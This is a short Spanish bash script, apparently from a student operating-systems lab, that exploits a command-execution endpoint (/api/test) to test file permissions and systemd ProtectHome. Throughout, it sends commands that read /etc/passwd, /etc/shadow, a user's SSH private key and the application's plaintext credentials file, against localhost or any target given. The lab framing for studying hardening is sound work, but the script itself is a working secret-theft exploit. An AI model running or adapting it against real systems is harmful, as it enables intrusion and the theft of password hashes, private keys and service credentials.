#!/usr/bin/env bash
# =============================================================================
# ATAQUE 1 - ROBO DE SECRETOS
# Prueba: permisos del sistema (DAC) + ProtectHome de systemd
# Idea: entrar por la ruta vulnerable /api/test y pedirle a la app que LEA
#       archivos privados. La app ejecuta cada 'cat' con SU propio usuario,
#       asi que vemos hasta donde llega leyendo el disco.
# Uso:  ./ataque1.sh            (ataca localhost:8080)
#       ./ataque1.sh IP:PUERTO  (ataca otra maquina)
# =============================================================================

TARGET="${1:-localhost:8080}"
API="http://$TARGET/api/test"

# Envia un comando a la app y muestra la respuesta de forma legible.
pedir() {
  echo "=============================================================="
  echo ">> La app ejecutara:  $1"
  echo "--------------------------------------------------------------"
  curl -s -G "$API" --data-urlencode "cmd=$1"
  echo
  echo
}

echo "################ ATAQUE 1 - ROBO DE SECRETOS (contra $TARGET) ################"
echo

# a) Contexto: con que usuario corre la app (de el dependen todos los permisos).
pedir 'whoami'

# b) /etc/passwd : lista de usuarios del sistema. Es de lectura global,
#    deberia leerse en AMBAS maquinas -> sirve de linea base ("si puede leer esto").
pedir 'cat /etc/passwd'

# c) /etc/shadow : hashes de contrasenas del sistema. Solo root deberia leerlo.
#    La app NO es root, asi que el propio DAC ya deberia negarlo aqui.
pedir 'cat /etc/shadow'

# d) Llave privada SSH del usuario (si existe en su HOME).
#    $(whoami) y la ruta se evaluan en el SERVIDOR (la app), no aqui.
pedir 'cat /home/$(whoami)/.ssh/id_rsa'

# e) LA JOYA: credenciales de la PROPIA app (base de datos Neon, Gmail, APIs)
#    en texto plano dentro del proyecto. Esto es lo que resuelve el Pilar 4.
pedir 'cat $HOME/Proyecto_Sistemas_Operativos/src/main/resources/application.properties'

echo "################ FIN ATAQUE 1 ################"
